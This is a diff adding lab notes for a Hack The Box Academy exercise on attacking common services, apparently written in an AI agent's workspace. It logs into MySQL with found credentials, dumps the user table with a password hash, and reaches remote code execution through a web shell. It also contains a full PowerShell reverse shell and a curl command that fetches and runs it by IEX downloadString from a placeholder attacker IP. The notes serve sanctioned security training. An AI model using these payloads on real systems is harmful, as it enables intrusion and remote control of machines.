@@ -88,3 +88,160 @@ Directory "C:\xampp\htdocs\"
 Ports: 80 & 4443
 Test Command: curl http://localhost/test.php
 ```
+
+## Port 3389 (RDP) wiht fion creds
+
+Didn't work. Couldn't login
+
+## Port 3306 (MySQL) with fiona creds
+
+Worked to login.
+
+```
+┌──(openclaw㉿srv1405873)-[~/.openclaw/workspace-neo/htb/academy/attacking-common-services-easy/raw_data]
+└─$ mysql -h 10.129.203.7 -u fiona -p987654321 --skip-ssl
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MariaDB connection id is 11
+Server version: 10.4.24-MariaDB mariadb.org binary distribution
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+MariaDB [(none)]> SHOW DATABASES;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| mysql              |
+| performance_schema |
+| phpmyadmin         |
+| test               |
++--------------------+
+5 rows in set (0.209 sec)
+```
+
+### Enumerating MySQL
+
+```
+MariaDB [phpmyadmin]> show tables;
++------------------------+
+| Tables_in_phpmyadmin   |
++------------------------+
+| pma__bookmark          |
+| pma__central_columns   |
+| pma__column_info       |
+| pma__designer_settings |
+| pma__export_templates  |
+| pma__favorite          |
+| pma__history           |
+| pma__navigationhiding  |
+| pma__pdf_pages         |
+| pma__recent            |
+| pma__relation          |
+| pma__savedsearches     |
+| pma__table_coords      |
+| pma__table_info        |
+| pma__table_uiprefs     |
+| pma__tracking          |
+| pma__userconfig        |
+| pma__usergroups        |
+| pma__users             |
++------------------------+
+19 rows in set (0.193 sec)
+
+MariaDB [phpmyadmin]> select * from pma__users;
+Empty set (0.461 sec)
+
+MariaDB [phpmyadmin]>
+```
+
+```
+MariaDB [mysql]> select * from user;
++-----------+-------+-------------------------------------------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+----------------+---------------------+--------------------+------------------+------------+--------------+------------------------+---------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+----------------------+-----------------------+-------------------------------------------+------------------+---------+--------------+--------------------+
+| Host      | User  | Password                                  | Select_priv | Insert_priv | Update_priv | Delete_priv | Create_priv | Drop_priv | Reload_priv | Shutdown_priv | Process_priv | File_priv | Grant_priv | References_priv | Index_priv | Alter_priv | Show_db_priv | Super_priv | Create_tmp_table_priv | Lock_tables_priv | Execute_priv | Repl_slave_priv | Repl_client_priv | Create_view_priv | Show_view_priv | Create_routine_priv | Alter_routine_priv | Create_user_priv | Event_priv | Trigger_priv | Create_tablespace_priv | Delete_history_priv | ssl_type | ssl_cipher | x509_issuer | x509_subject | max_questions | max_updates | max_connections | max_user_connections | plugin                | authentication_string                     | password_expired | is_role | default_role | max_statement_time |
++-----------+-------+-------------------------------------------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+----------------+---------------------+--------------------+------------------+------------+--------------+------------------------+---------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+----------------------+-----------------------+-------------------------------------------+------------------+---------+--------------+--------------------+
+| localhost | root  |                                           | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      | Y                   |          |            |             |              |             0 |           0 |               0 |                    0 |                       |                                           | N                | N       |              |           0.000000 |
+| %         | fiona | *DABCF719388B72AD432DE5E88423B56D652DD8B0 | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | N          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      | Y                   |          |            |             |              |             0 |           0 |               0 |                    0 | mysql_native_password | *DABCF719388B72AD432DE5E88423B56D652DD8B0 | N                | N       |              |           0.000000 |
+| 127.0.0.1 | root  |                                           | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      | Y                   |          |            |             |              |             0 |           0 |               0 |                    0 |                       |                                           | N                | N       |              |           0.000000 |
+| ::1       | root  |                                           | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      | Y                   |          |            |             |              |             0 |           0 |               0 |                    0 |                       |                                           | N                | N       |              |           0.000000 |
+| localhost | pma   |                                           | N           | N           | N           | N           | N           | N         | N           | N             | N            | N         | N          | N               | N          | N          | N            | N          | N                     | N                | N            | N               | N                | N                | N              | N                   | N                  | N                | N          | N            | N                      | N                   |          |            |             |              |             0 |           0 |               0 |                    0 | mysql_native_password |                                           | N                | N       |              |           0.000000 |
++-----------+-------+-------------------------------------------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+----------------+---------------------+--------------------+------------------+------------+--------------+------------------------+---------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+----------------------+-----------------------+-------------------------------------------+------------------+---------+--------------+--------------------+
+5 rows in set (0.198 sec)
+```
+
+```
+MariaDB [mysql]> use test;
+Database changed
+MariaDB [test]> show tables;
+Empty set (0.195 sec)
+
+MariaDB [test]>
+```
+
+Vulnerable to writing to files from MySQL:
+
+```
+MariaDB [test]> show variables like "secure_file_priv";
++------------------+-------+
+| Variable_name    | Value |
++------------------+-------+
+| secure_file_priv |       |
++------------------+-------+
+1 row in set (0.195 sec)
+```
+
+We got RCE
+
+```
+➜  ~ curl "http://inlanefreight.htb/shell.php?cmd=whoami"
+nt authority\system
+```
+
+Got RCE
+
+Used RCE to create rev shell.
+
+```
+cat > /tmp/rev.ps1 << 'EOF'
+$client = New-Object System.Net.Sockets.TCPClient("<your-kali-ip>",4444);
+$stream = $client.GetStream();
+$writer = New-Object System.IO.StreamWriter($stream);
+$reader = New-Object System.IO.StreamReader($stream);
+$writer.AutoFlush = $true;
+$writer.WriteLine("Connected");
+while($client.Connected) {
+    $cmd = $reader.ReadLine();
+    if($cmd -eq "exit") { break }
+    $output = Invoke-Expression $cmd 2>&1 | Out-String;
+    $writer.WriteLine($output);
+}
+$client.Close();
+EOF
+python3 -m http.server 8080
+
+# Trigger via web shell
+curl "http://inlanefreight.htb/shell.php?cmd=powershell%20-ExecutionPolicy%20Bypass%20-c%20%22IEX(New-Object%20Net.WebClient).downloadString('http://<your-kali-ip>:8080/rev.ps1')%22"
+```
+
+
+Got the flag
+
+```
+cd c:\Users\Administrator\Desktop
+
+dir
+
+
+    Directory: C:\Users\Administrator\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        4/22/2022  10:36 AM             39 flag.txt
+
+
+
+type flag.txt
+HTB{t#3r3_4r3_tw0_w4y$_t0_93t_t#3_fl49}
+```
